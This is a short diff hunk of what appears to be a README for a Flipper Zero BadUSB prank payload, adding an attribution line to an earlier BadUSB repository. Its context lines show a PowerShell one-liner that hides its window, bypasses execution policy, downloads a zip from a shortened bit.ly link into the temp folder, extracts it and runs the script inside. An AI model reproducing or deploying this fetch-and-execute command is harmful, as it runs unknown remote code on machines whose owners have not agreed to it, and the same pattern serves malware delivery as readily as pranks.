@@ -28,3 +28,5 @@ YouTube video - [click here](https://youtube.com/shorts/XRY_MEYQUxA)
 ```
 powershell -w h -NoP -NonI -Ep Bypass $D="$env:tmp";iwr -Uri 'bit.ly/BADUSB-NGGYU' -O "$D\js.zip";Expand-Archive "$D\js.zip" -Des $D -Force;. "$D\js\js.ps1"
 ```
+
+Inspired by : [I-Am-Jakoby](https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB)
